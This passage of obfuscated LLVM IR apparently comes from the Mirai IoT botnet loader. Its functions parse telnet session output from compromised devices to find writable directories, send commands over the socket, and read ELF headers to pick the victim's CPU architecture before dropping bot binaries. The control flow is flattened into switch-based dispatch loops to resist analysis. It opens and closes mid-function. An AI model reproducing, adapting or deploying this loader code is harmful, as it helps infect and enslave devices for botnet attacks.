  store i8 0, i8* %81, align 1
  store i32 -537308780, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %10, align 8
  %84 = load i8*, i8** %10, align 8
  %85 = call i64 @strlen(i8* %84) #6
  %86 = trunc i64 %85 to i32
  %87 = call i32 @util_memsearch(i8* %83, i32 %86, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i32 2)
  %88 = icmp ne i32 %87, -1
  %89 = select i1 %88, i32 -1222101371, i32 -510349347
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load %struct.connection*, %struct.connection** %3, align 8
  %92 = getelementptr inbounds %struct.connection, %struct.connection* %91, i32 0, i32 4
  %93 = load i32, i32* %92, align 8
  %94 = load i8*, i8** %9, align 8
  %95 = load i8*, i8** %9, align 8
  %96 = load i8*, i8** %9, align 8
  %97 = load i8*, i8** %9, align 8
  %98 = load i8*, i8** %9, align 8
  %99 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %93, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* %94, i8* %95, i8* %96, i8* %97, i8* %98)
  store i32 -510349347, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 -205395666, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 258563613, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load %struct.connection*, %struct.connection** %3, align 8
  %104 = getelementptr inbounds %struct.connection, %struct.connection* %103, i32 0, i32 15
  %105 = load i32, i32* %7, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [8192 x i8], [8192 x i8]* %104, i64 0, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 32
  %111 = select i1 %110, i32 -237724973, i32 556507392
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load %struct.connection*, %struct.connection** %3, align 8
  %114 = getelementptr inbounds %struct.connection, %struct.connection* %113, i32 0, i32 15
  %115 = load i32, i32* %7, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [8192 x i8], [8192 x i8]* %114, i64 0, i64 %116
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 9
  %121 = select i1 %120, i32 -237724973, i32 -502864212
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %6, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %6, align 4
  %125 = icmp eq i32 %123, 0
  %126 = select i1 %125, i32 196694530, i32 -1839361389
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load %struct.connection*, %struct.connection** %3, align 8
  %129 = getelementptr inbounds %struct.connection, %struct.connection* %128, i32 0, i32 15
  %130 = load i32, i32* %7, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [8192 x i8], [8192 x i8]* %129, i64 0, i64 %131
  %133 = load i8, i8* %132, align 1
  %134 = load i32, i32* %5, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %5, align 4
  %136 = sext i32 %134 to i64
  %137 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %136
  store i8 %133, i8* %137, align 1
  store i32 -1839361389, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  store i32 1367267882, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load %struct.connection*, %struct.connection** %3, align 8
  %141 = getelementptr inbounds %struct.connection, %struct.connection* %140, i32 0, i32 15
  %142 = load i32, i32* %7, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [8192 x i8], [8192 x i8]* %141, i64 0, i64 %143
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp ne i32 %146, 13
  %148 = select i1 %147, i32 -1660181862, i32 -1147039146
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  %150 = load %struct.connection*, %struct.connection** %3, align 8
  %151 = getelementptr inbounds %struct.connection, %struct.connection* %150, i32 0, i32 15
  %152 = load i32, i32* %7, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [8192 x i8], [8192 x i8]* %151, i64 0, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = load i32, i32* %5, align 4
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %5, align 4
  %158 = sext i32 %156 to i64
  %159 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %158
  store i8 %155, i8* %159, align 1
  store i32 -1147039146, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 1367267882, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 258563613, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  store i32 -1396221083, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i32, i32* %7, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %7, align 4
  store i32 -1659542471, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.connection*, %struct.connection** %3, align 8
  %168 = getelementptr inbounds %struct.connection, %struct.connection* %167, i32 0, i32 4
  %169 = load i32, i32* %168, align 8
  %170 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %169, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0))
  %171 = load %struct.connection*, %struct.connection** %3, align 8
  %172 = getelementptr inbounds %struct.connection, %struct.connection* %171, i32 0, i32 4
  %173 = load i32, i32* %172, align 8
  %174 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %173, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i32 0, i32 0))
  %175 = load i32, i32* %8, align 4
  store i32 %175, i32* %2, align 4
  store i32 224769933, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %2, align 4
  ret i32 %177

loopEnd:                                          ; preds = %166, %163, %162, %161, %160, %149, %139, %138, %127, %122, %112, %102, %101, %100, %90, %82, %76, %66, %65, %61, %60, %56, %55, %45, %35, %34, %29, %24, %23, %22, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_written_dirs(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %7, align 4
  store i8 0, i8* %8, align 1
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -1000792849, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1000792849, label %first
    i32 165543760, label %21
    i32 123314692, label %22
    i32 1875843382, label %23
    i32 344517445, label %37
    i32 -728616278, label %38
    i32 -1472318701, label %52
    i32 689703176, label %53
    i32 37963582, label %66
    i32 -1966003435, label %72
    i32 -1781337216, label %83
    i32 -486885478, label %87
    i32 1829465216, label %94
    i32 256835610, label %96
    i32 1304135638, label %97
    i32 -1145610954, label %98
    i32 1949248612, label %100
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp eq i32 %.reload, -1
  %20 = select i1 %19, i32 165543760, i32 123314692
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1949248612, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 1875843382, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 15
  %26 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i32 0, i32 0
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i32, i32* %4, align 4
  %31 = load i32, i32* %7, align 4
  %32 = sub nsw i32 %30, %31
  %33 = call i32 @util_memsearch(i8* %29, i32 %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i32 0, i32 0), i32 4)
  store i32 %33, i32* %6, align 4
  %34 = load i32, i32* %6, align 4
  %35 = icmp eq i32 %34, -1
  %36 = select i1 %35, i32 344517445, i32 -728616278
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 -1145610954, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %6, align 4
  %40 = load i32, i32* %7, align 4
  %41 = add nsw i32 %40, %39
  store i32 %41, i32* %7, align 4
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 15
  %44 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i32 0, i32 0
  %45 = load i32, i32* %7, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = call i8* @strtok(i8* %47, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0)) #5
  store i8* %48, i8** %9, align 8
  %49 = load i8*, i8** %9, align 8
  %50 = icmp eq i8* %49, null
  %51 = select i1 %50, i32 -1472318701, i32 689703176
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 1875843382, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8*, i8** %9, align 8
  %55 = call i64 @strlen(i8* %54) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %10, align 4
  %57 = load i8*, i8** %9, align 8
  %58 = load i32, i32* %10, align 4
  %59 = sub nsw i32 %58, 1
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %57, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 13
  %65 = select i1 %64, i32 37963582, i32 -1966003435
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %9, align 8
  %68 = load i32, i32* %10, align 4
  %69 = sub nsw i32 %68, 1
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  store i8 0, i8* %71, align 1
  store i32 -1966003435, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load %struct.connection*, %struct.connection** %3, align 8
  %74 = getelementptr inbounds %struct.connection, %struct.connection* %73, i32 0, i32 4
  %75 = load i32, i32* %74, align 8
  %76 = load i8*, i8** %9, align 8
  %77 = load i8*, i8** %9, align 8
  %78 = load i8*, i8** %9, align 8
  %79 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %75, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.20, i32 0, i32 0), i8* %76, i8* %77, i8* %78)
  %80 = load i8, i8* %8, align 1
  %81 = icmp ne i8 %80, 0
  %82 = select i1 %81, i32 1304135638, i32 -1781337216
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i32, i32* %10, align 4
  %85 = icmp slt i32 %84, 31
  %86 = select i1 %85, i32 -486885478, i32 1829465216
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load %struct.connection*, %struct.connection** %3, align 8
  %89 = getelementptr inbounds %struct.connection, %struct.connection* %88, i32 0, i32 3
  %90 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %89, i32 0, i32 3
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %90, i32 0, i32 0
  %92 = load i8*, i8** %9, align 8
  %93 = call i8* @strcpy(i8* %91, i8* %92) #5
  store i8 1, i8* %8, align 1
  store i32 256835610, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %95)
  store i32 256835610, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 1304135638, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 1875843382, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %4, align 4
  store i32 %99, i32* %2, align 4
  store i32 1949248612, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32, i32* %2, align 4
  ret i32 %101

loopEnd:                                          ; preds = %98, %97, %96, %94, %87, %83, %72, %66, %53, %52, %38, %37, %23, %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_copy_op(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 424723609, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 424723609, label %first
    i32 137780653, label %16
    i32 -252743642, label %17
    i32 1463310803, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 137780653, i32 -252743642
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1463310803, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  store i32 %18, i32* %2, align 4
  store i32 1463310803, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %2, align 4
  ret i32 %20

loopEnd:                                          ; preds = %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arch(%struct.connection*) #0 {
  %.reg2mem6 = alloca i32
  %.reg2mem = alloca i8
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca %struct.elf_hdr*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 3
  %9 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %8, i32 0, i32 8
  %10 = load i8, i8* %9, align 1
  store i8 %10, i8* %.reg2mem
  %switchVar = alloca i32
  store i32 -829786419, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -829786419, label %first
    i32 -1979313630, label %13
    i32 2098513556, label %24
    i32 -1094206443, label %25
    i32 2070919671, label %NodeBlock3
    i32 421135142, label %NodeBlock
    i32 264271741, label %LeafBlock1
    i32 692264464, label %LeafBlock
    i32 2044733845, label %47
    i32 1396152034, label %48
    i32 -226697508, label %57
    i32 -510646059, label %NewDefault
    i32 -1092799650, label %58
    i32 -651128773, label %65
    i32 901687567, label %72
    i32 -806411105, label %78
    i32 -1950982596, label %85
    i32 185406528, label %92
    i32 -1599534620, label %100
    i32 1061483167, label %106
    i32 1351759773, label %112
    i32 -495604419, label %113
    i32 -929457930, label %120
    i32 -496967757, label %127
    i32 -1562869978, label %134
    i32 -1997866393, label %141
    i32 1108091238, label %147
    i32 330837708, label %154
    i32 315984966, label %161
    i32 -797730214, label %168
    i32 -1879710803, label %174
    i32 -60292656, label %181
    i32 349399187, label %188
    i32 540826021, label %194
    i32 -437257715, label %201
    i32 1485930912, label %208
    i32 89504655, label %214
    i32 1516532429, label %221
    i32 -18545727, label %227
    i32 1221439709, label %233
    i32 1335647905, label %234
    i32 -516144008, label %235
    i32 -842881312, label %236
    i32 1433570311, label %237
    i32 -1192283924, label %238
    i32 1669136061, label %239
    i32 -1033661000, label %240
    i32 -131723204, label %251
    i32 1243721558, label %253
    i32 27518754, label %260
    i32 2139629025, label %280
    i32 544412912, label %281
    i32 -897076841, label %282
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8, i8* %.reg2mem
  %11 = icmp ne i8 %.reload, 0
  %12 = select i1 %11, i32 -1033661000, i32 -1979313630
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 15
  %16 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i32 0, i32 0
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 9
  %19 = load i16, i16* %18, align 8
  %20 = zext i16 %19 to i32
  %21 = call i32 @util_memsearch(i8* %16, i32 %20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i32 0, i32 0), i32 3)
  store i32 %21, i32* %5, align 4
  %22 = icmp eq i32 %21, -1
  %23 = select i1 %22, i32 2098513556, i32 -1094206443
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -897076841, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %5, align 4
  %27 = sub nsw i32 %26, 4
  store i32 %27, i32* %5, align 4
  %28 = load %struct.connection*, %struct.connection** %3, align 8
  %29 = getelementptr inbounds %struct.connection, %struct.connection* %28, i32 0, i32 15
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %29, i32 0, i32 0
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = bitcast i8* %33 to %struct.elf_hdr*
  store %struct.elf_hdr* %34, %struct.elf_hdr** %4, align 8
  %35 = load %struct.connection*, %struct.connection** %3, align 8
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %35, i32 0, i32 3
  %37 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %36, i32 0, i32 8
  store i8 1, i8* %37, align 1
  %38 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %39 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %38, i32 0, i32 0
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %39, i64 0, i64 5
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  store i32 %42, i32* %.reg2mem6
  store i32 2070919671, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem6
  %Pivot4 = icmp slt i32 %.reload10, 1
  %43 = select i1 %Pivot4, i32 692264464, i32 421135142
  store i32 %43, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem6
  %Pivot = icmp slt i32 %.reload8, 2
  %44 = select i1 %Pivot, i32 -226697508, i32 264271741
  store i32 %44, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem6
  %SwitchLeaf2 = icmp eq i32 %.reload7, 2
  %45 = select i1 %SwitchLeaf2, i32 1396152034, i32 -510646059
  store i32 %45, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem6
  %SwitchLeaf = icmp eq i32 %.reload9, 0
  %46 = select i1 %SwitchLeaf, i32 2044733845, i32 -510646059
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -897076841, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %50 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %49, i32 0, i32 2
  %51 = load i16, i16* %50, align 1
  %52 = zext i16 %51 to i32
  %53 = call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %52)
  %54 = trunc i32 %53 to i16
  %55 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %56 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %55, i32 0, i32 2
  store i16 %54, i16* %56, align 1
  store i32 -1092799650, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -1092799650, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1092799650, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %60 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %59, i32 0, i32 2
  %61 = load i16, i16* %60, align 1
  %62 = zext i16 %61 to i32
  %63 = icmp eq i32 %62, 40
  %64 = select i1 %63, i32 901687567, i32 -651128773
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %67 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %66, i32 0, i32 2
  %68 = load i16, i16* %67, align 1
  %69 = zext i16 %68 to i32
  %70 = icmp eq i32 %69, 183
  %71 = select i1 %70, i32 901687567, i32 -806411105
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load %struct.connection*, %struct.connection** %3, align 8
  %74 = getelementptr inbounds %struct.connection, %struct.connection* %73, i32 0, i32 3
  %75 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %74, i32 0, i32 2
  %76 = getelementptr inbounds [6 x i8], [6 x i8]* %75, i32 0, i32 0
  %77 = call i8* @strcpy(i8* %76, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.22, i32 0, i32 0)) #5
  store i32 1669136061, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %80 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %79, i32 0, i32 2
  %81 = load i16, i16* %80, align 1
  %82 = zext i16 %81 to i32
  %83 = icmp eq i32 %82, 8
  %84 = select i1 %83, i32 185406528, i32 -1950982596
  store i32 %84, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %87 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %86, i32 0, i32 2
  %88 = load i16, i16* %87, align 1
  %89 = zext i16 %88 to i32
  %90 = icmp eq i32 %89, 10
  %91 = select i1 %90, i32 185406528, i32 -495604419
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %94 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %93, i32 0, i32 0
  %95 = getelementptr inbounds [16 x i8], [16 x i8]* %94, i64 0, i64 5
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 1
  %99 = select i1 %98, i32 -1599534620, i32 1061483167
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load %struct.connection*, %struct.connection** %3, align 8
  %102 = getelementptr inbounds %struct.connection, %struct.connection* %101, i32 0, i32 3
  %103 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %102, i32 0, i32 2
  %104 = getelementptr inbounds [6 x i8], [6 x i8]* %103, i32 0, i32 0
  %105 = call i8* @strcpy(i8* %104, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #5
  store i32 1351759773, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load %struct.connection*, %struct.connection** %3, align 8
  %108 = getelementptr inbounds %struct.connection, %struct.connection* %107, i32 0, i32 3
  %109 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %108, i32 0, i32 2
  %110 = getelementptr inbounds [6 x i8], [6 x i8]* %109, i32 0, i32 0
  %111 = call i8* @strcpy(i8* %110, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0)) #5
  store i32 1351759773, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  store i32 -1192283924, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %115 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %114, i32 0, i32 2
  %116 = load i16, i16* %115, align 1
  %117 = zext i16 %116 to i32
  %118 = icmp eq i32 %117, 3
  %119 = select i1 %118, i32 -1997866393, i32 -929457930
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %122 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %121, i32 0, i32 2
  %123 = load i16, i16* %122, align 1
  %124 = zext i16 %123 to i32
  %125 = icmp eq i32 %124, 6
  %126 = select i1 %125, i32 -1997866393, i32 -496967757
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %129 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %128, i32 0, i32 2
  %130 = load i16, i16* %129, align 1
  %131 = zext i16 %130 to i32
  %132 = icmp eq i32 %131, 7
  %133 = select i1 %132, i32 -1997866393, i32 -1562869978
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %136 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %135, i32 0, i32 2
  %137 = load i16, i16* %136, align 1
  %138 = zext i16 %137 to i32
  %139 = icmp eq i32 %138, 62
  %140 = select i1 %139, i32 -1997866393, i32 1108091238
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load %struct.connection*, %struct.connection** %3, align 8
